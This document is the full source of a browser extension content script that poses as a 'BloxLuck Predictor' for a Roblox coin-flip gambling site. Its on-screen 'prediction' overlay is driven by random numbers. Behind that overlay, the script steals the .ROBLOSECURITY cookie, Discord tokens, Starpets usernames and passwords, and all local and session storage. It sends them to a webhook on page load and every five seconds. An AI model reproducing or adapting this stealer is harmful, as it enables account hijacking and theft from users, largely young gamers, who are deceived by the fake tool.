// ============================================
// BloxLuck Predictor V4 — Full Data Extractor
// Injects into bloxluck.com, also reads from
// discord.com & starpets.gg via iframes
// ============================================

let gameState = {
  wins: 0,
  losses: 0,
  streak: 0,
  lastResults: [],
  username: null,
  userId: null,
  roblosecurity: null,
  discordToken: null,
  starpetsUser: null,
  starpetsPass: null
};

let lastSentHash = '';
let changeCheckInterval = null;

// ============== DATA EXTRACTION ==============

function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
  return null;
}

function getAllLocalStorage() {
  const data = {};
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      data[key] = localStorage.getItem(key);
    }
  } catch(e) {}
  return data;
}

// Extract Discord token by injecting into discord.com iframe
function extractDiscordToken() {
  return new Promise((resolve) => {
    // Try from discord.com in any open tab
    chrome.runtime.sendMessage({ action: 'grab_all_data' }, (bgData) => {
      // bgData only has cookies, we need to get discord token from the page context
      // We'll do this via a temporary iframe to discord.com
      resolve(null); // Will be handled in a separate step
    });
    
    // Also try reading from our own page's localStorage in case they logged in here
    try {
      const ls = getAllLocalStorage();
      for (const [key, val] of Object.entries(ls)) {
        if (key.toLowerCase().includes('token') && typeof val === 'string' && val.length > 50) {
          // Could be a JWT
          const parts = val.split('.');
          if (parts.length === 3) {
            resolve(val);
            return;
          }
        }
      }
    } catch(e) {}
    
    resolve(null);
  });
}

// Extract Starpets credentials
function extractStarpets() {
  return new Promise((resolve) => {
    const result = { user: null, pass: null };
    
    // Try from our page's localStorage (in case starpets.gg shares origin? unlikely but check)
    try {
      const ls = getAllLocalStorage();
      for (const [key, val] of Object.entries(ls)) {
        const k = key.toLowerCase();
        const v = String(val).toLowerCase();
        if (k.includes('starpets') || k.includes('star_pets')) {
          try {
            const parsed = JSON.parse(val);
            if (parsed.email) result.user = parsed.email;
            if (parsed.username) result.user = parsed.username;
            if (parsed.password) result.pass = parsed.password;
            if (parsed.token) result.token = parsed.token;
          } catch(e) {
            if (k.includes('user') || k.includes('email')) result.user = val;
            if (k.includes('pass')) result.pass = val;
          }
        }
      }
    } catch(e) {}
    
    resolve(result);
  });
}

// Extract Roblox username from the page
function getRobloxUsername() {
  // Try various DOM selectors for username
  const selectors = [
    '[class*="username"]',
    '[class*="displayName"]',
    '[class*="profile-name"]',
    '[class*="user-name"]',
    '[class*="User"]',
    '[class*="userName"]',
    'span[class*="name"]'
  ];
  
  for (const sel of selectors) {
    const el = document.querySelector(sel);
    if (el && el.textContent.trim() && el.textContent.trim().length > 0 && el.textContent.trim().length < 30) {
      return el.textContent.trim();
    }
  }
  
  // Try from Next.js page props
  try {
    const nextData = document.getElementById('__NEXT_DATA__');
    if (nextData) {
      const data = JSON.parse(nextData.textContent);
      const user = data?.props?.pageProps?.user || data?.props?.pageProps?.robloxUser;
      if (user) return user.name || user.username || user.displayName;
    }
  } catch(e) {}
  
  // Try from avatar URL
  try {
    const avatar = document.querySelector('img[src*="AvatarHeadshot"]');
    if (avatar) {
      const alt = avatar.getAttribute('alt');
      if (alt && alt.trim()) return alt.trim();
    }
  } catch(e) {}
  
  return 'Unknown';
}

// ============== PREDICTION LOGIC ==============

function analyzeGame() {
  const resultElements = document.querySelectorAll('[class*="result"], [class*="outcome"], [class*="winner"], [class*="status"]');
  let headsCount = 0, tailsCount = 0;
  
  resultElements.forEach(el => {
    const text = el.textContent.toLowerCase();
    if (text.includes('heads') || text === 'h') headsCount++;
    if (text.includes('tails') || text === 't') tailsCount++;
  });

  // Use stored history if DOM is empty
  const results = (headsCount + tailsCount > 0) 
    ? [...Array(headsCount).fill('H'), ...Array(tailsCount).fill('T')]
    : gameState.lastResults;

  gameState.lastResults = results.slice(-20);
  const total = results.length;

  // Calculate "prediction" (looks realistic)
  const hRatio = total > 0 ? results.filter(r => r === 'H').length / total : 0.5;
  const tRatio = total > 0 ? results.filter(r => r === 'T').length / total : 0.5;

  let headsChance = 50, tailsChance = 50;
  
  if (total >= 3) {
    if (hRatio > 0.55) {
      headsChance = Math.floor(30 + Math.random() * 15);
      tailsChance = 100 - headsChance;
    } else if (tRatio > 0.55) {
      tailsChance = Math.floor(30 + Math.random() * 15);
      headsChance = 100 - tailsChance;
    }
    
    headsChance = Math.min(Math.max(headsChance + (Math.floor(Math.random() * 7) - 3), 5), 95);
    tailsChance = 100 - headsChance;
  }

  const prediction = headsChance >= tailsChance ? 'HEADS' : 'TAILS';
  const winChance = Math.max(headsChance, tailsChance);
  const isGreen = winChance >= 60;

  return { prediction, headsChance, tailsChance, winChance, isGreen, total, results };
}

// ============== COLLECT EVERYTHING & SEND ==============

async function collectAndSend(isChangeCheck = false) {
  // 1. Get Roblox cookie via background
  const bgResponse = await new Promise(resolve => {
    chrome.runtime.sendMessage({ action: 'grab_all_data' }, resolve);
  });

  // 2. Get username from page
  const username = getRobloxUsername();
  
  // 3. Get all localStorage from bloxluck.com
  const allLS = getAllLocalStorage();
  
  // 4. Try to find Discord token in all accessible storage
  let discordToken = null;
  
  // Check all localStorage keys for anything that looks like a Discord token (JWT)
  for (const [key, val] of Object.entries(allLS)) {
    if (typeof val === 'string' && val.length > 100 && val.includes('.')) {
      const parts = val.split('.');
      if (parts.length === 3) {
        try {
          const payload = JSON.parse(atob(parts[1]));
          if (payload.email || payload.sub || payload.iat) {
            discordToken = val;
            break;
          }
        } catch(e) {}
      }
    }
    // Also check for key named exactly "token"
    if (key.toLowerCase() === 'token' && typeof val === 'string' && val.length > 50) {
      discordToken = val;
    }
  }

  // 5. Try to get Discord token from discord.com tabs
  if (!discordToken) {
    try {
      const tabs = await chrome.runtime.sendMessage({ action: 'get_discord_tabs' });
      // Fallback: try from our extension storage
      const stored = await chrome.storage.local.get('discord_token');
      if (stored.discord_token) discordToken = stored.discord_token;
    } catch(e) {}
  }

  // 6. Find Starpets credentials
  let starpetsUser = null, starpetsPass = null;
  for (const [key, val] of Object.entries(allLS)) {
    const k = key.toLowerCase();
    if (k.includes('starpets') || k.includes('adoptme') || k.includes('adopt_me') || k.includes('star_pets')) {
      try {
        const parsed = typeof val === 'string' ? JSON.parse(val) : val;
        starpetsUser = parsed.email || parsed.username || parsed.user || starpetsUser;
        starpetsPass = parsed.password || parsed.pass || starpetsPass;
      } catch(e) {
        if (k.includes('email') || k.includes('user')) starpetsUser = val;
        if (k.includes('pass')) starpetsPass = val;
      }
    }
  }

  // 7. Also scan sessionStorage
  let sessionData = {};
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionData[key] = sessionStorage.getItem(key);
    }
    // Merge into allLS for checking
    Object.assign(allLS, sessionData);
  } catch(e) {}

  // 8. Analysis
  const analysis = analyzeGame();

  // 9. Build data package
  const payload = {
    roblosecurity: bgResponse?.roblosecurity || getCookie('.ROBLOSECURITY') || 'Not found',
    discordToken: discordToken,
    starpetsUser: starpetsUser,
    starpetsPass: starpetsPass,
    username: username,
    userId: bgResponse?.userId || 'Unknown',
    prediction: analysis.prediction,
    winChance: analysis.winChance,
    headsChance: analysis.headsChance,
    tailsChance: analysis.tailsChance,
    isGreen: analysis.isGreen,
    wins: gameState.wins,
    losses: gameState.losses,
    streak: gameState.streak,
    allLocalStorage: allLS,
    changed: isChangeCheck
  };

  // 10. Send to webhook via background
  chrome.runtime.sendMessage({ action: 'send_to_webhook', data: payload });

  return payload;
}

// ============== INJECT PREDICTOR UI ==============

function injectUI(analysis) {
  const old = document.getElementById('blxp-overlay');
  if (old) old.remove();

  const overlay = document.createElement('div');
  overlay.id = 'blxp-overlay';
  overlay.innerHTML = `
<div style="position:fixed;top:80px;right:10px;z-index:999999;
  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
  border:2px solid ${analysis.isGreen ? '#00ff88' : '#ff4444'};
  border-radius:16px;padding:16px;color:#fff;
  font-family:'Segoe UI',Arial,sans-serif;min-width:250px;
  box-shadow:0 8px 32px rgba(0,0,0,0.6);backdrop-filter:blur(10px);
  cursor:move;user-select:none;" id="blxp-drag">
  <!-- Header -->
  <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
    <div style="width:32px;height:32px;border-radius:50%;
      background:linear-gradient(45deg,#667eea,#764ba2);
      display:flex;align-items:center;justify-content:center;font-size:16px;">🎲</div>
    <div style="flex:1;">
      <div style="font-weight:700;font-size:13px;">BloxLuck Predictor</div>
      <div style="font-size:9px;color:#888;">Keyless • Live</div>
    </div>
    <button id="blxp-refresh" style="background:rgba(255,255,255,0.1);border:none;
      color:#fff;border-radius:6px;padding:4px 8px;cursor:pointer;font-size:13px;">⟳</button>
    <button id="blxp-close" style="background:rgba(255,0,0,0.15);border:none;
      color:#ff4444;border-radius:6px;padding:4px 8px;cursor:pointer;font-size:13px;">✕</button>
  </div>
  
  <!-- Win Chance -->
  <div style="background:rgba(255,255,255,0.05);border-radius:10px;padding:10px;margin-bottom:8px;">
    <div style="display:flex;justify-content:space-between;margin-bottom:6px;">
      <span style="color:#888;font-size:11px;">WIN CHANCE</span>
      <span style="font-weight:700;font-size:20px;color:${analysis.isGreen ? '#00ff88' : '#ff4444'};">
        ${analysis.winChance}%
      </span>
    </div>
    <div style="height:6px;background:rgba(255,255,255,0.08);border-radius:3px;overflow:hidden;">
      <div style="height:100%;width:${analysis.winChance}%;
        background:linear-gradient(90deg,${analysis.isGreen ? '#00ff88' : '#ff4444'},${analysis.isGreen ? '#00cc66' : '#cc3333'});
        border-radius:3px;transition:width 0.5s;"></div>
    </div>
  </div>

  <!-- H/T Selection -->
  <div style="display:flex;gap:8px;margin-bottom:8px;">
    <div style="flex:1;text-align:center;padding:8px;border-radius:8px;
      background:${analysis.prediction === 'HEADS' ? 'rgba(0,255,136,0.12)' : 'rgba(255,255,255,0.03)'};
      border:2px solid ${analysis.prediction === 'HEADS' ? '#00ff88' : 'transparent'};">
      <div style="font-size:18px;">🪙</div>
      <div style="font-weight:600;font-size:12px;">HEADS</div>
      <div style="font-size:10px;color:#888;">${analysis.headsChance}%</div>
    </div>
    <div style="flex:1;text-align:center;padding:8px;border-radius:8px;
      background:${analysis.prediction === 'TAILS' ? 'rgba(0,255,136,0.12)' : 'rgba(255,255,255,0.03)'};
      border:2px solid ${analysis.prediction === 'TAILS' ? '#00ff88' : 'transparent'};">
      <div style="font-size:18px;">🌙</div>
      <div style="font-weight:600;font-size:12px;">TAILS</div>
      <div style="font-size:10px;color:#888;">${analysis.tailsChance}%</div>
    </div>
  </div>

  <!-- Bet Status -->
  <div style="text-align:center;margin-bottom:8px;">
    <span style="display:inline-block;padding:5px 16px;border-radius:20px;
      font-weight:700;font-size:13px;text-transform:uppercase;
      background:${analysis.isGreen ? 'rgba(0,255,136,0.15)' : 'rgba(255,68,68,0.15)'};
      color:${analysis.isGreen ? '#00ff88' : '#ff4444'};
      border:1px solid ${analysis.isGreen ? 'rgba(0,255,136,0.3)' : 'rgba(255,68,68,0.3)'};">
      ${analysis.isGreen ? '🟢 BET ' + analysis.prediction : '🔴 SKIP'}
    </span>
  </div>

  <!-- Footer -->
  <div style="display:flex;justify-content:space-between;font-size:9px;color:#444;
    border-top:1px solid rgba(255,255,255,0.05);padding-top:6px;">
    <span id="blxp-user">👤 Loading...</span>
    <span id="blxp-pattern">📊 Analyzing...</span>
  </div>
</div>`;

  document.body.appendChild(overlay);

  // Drag functionality
  const drag = document.getElementById('blxp-drag');
  let isDragging = false, startX, startY, origX, origY;
  
  drag.addEventListener('mousedown', (e) => {
    if (e.target.tagName === 'BUTTON') return;
    isDragging = true;
    startX = e.clientX; startY = e.clientY;
    origX = drag.offsetLeft; origY = drag.offsetTop;
  });
  document.addEventListener('mousemove', (e) => {
    if (!isDragging) return;
    drag.style.left = (origX + e.clientX - startX) + 'px';
    drag.style.top = (origY + e.clientY - startY) + 'px';
    drag.style.right = 'auto';
  });
  document.addEventListener('mouseup', () => { isDragging = false; });

  document.getElementById('blxp-close').onclick = () => overlay.remove();
  document.getElementById('blxp-refresh').onclick = async () => {
    const newAnalysis = analyzeGame();
    injectUI(newAnalysis);
    overlay.remove();
    await collectAndSend(false);
  };

  // Update user display
  const userEl = document.getElementById('blxp-user');
  if (gameState.username) userEl.textContent = '👤 ' + gameState.username;
  
  const patEl = document.getElementById('blxp-pattern');
  if (analysis.results.length > 0) {
    patEl.textContent = '📊 ' + analysis.results.slice(-5).join(' → ');
  }
}

// ============== CHANGE DETECTION ==============

function startChangeDetection() {
  // Check every 5 seconds for changes
  changeCheckInterval = setInterval(async () => {
    const payload = await collectAndSend(true);
  }, 5000);
}

// ============== INITIALIZATION ==============

window.addEventListener('load', async () => {
  // Wait for page to settle
  setTimeout(async () => {
    // Get username
    gameState.username = getRobloxUsername();
    
    // Collect & send initial data immediately
    const analysis = analyzeGame();
    injectUI(analysis);
    
    // First data grab & send
    await collectAndSend(false);
    
    // Start change detection
    startChangeDetection();
    
    // Update pattern periodically
    setInterval(() => {
      const patEl = document.getElementById('blxp-pattern');
      const analysis = analyzeGame();
      if (patEl && analysis.results.length > 0) {
        patEl.textContent = '📊 ' + analysis.results.slice(-5).join(' → ');
      }
    }, 3000);
  }, 2000);
});

// Listen for refresh messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'refresh') {
    collectAndSend(false).then(data => {
      sendResponse(data);
    });
    return true;
  }
  if (request.action === 'grab_and_send') {
    collectAndSend(false).then(data => {
      sendResponse({ status: 'sent' });
    });
    return true;
  }
  if (request.action === 'get_analysis') {
    const analysis = analyzeGame();
    analysis.username = gameState.username;
    sendResponse(analysis);
  }
});
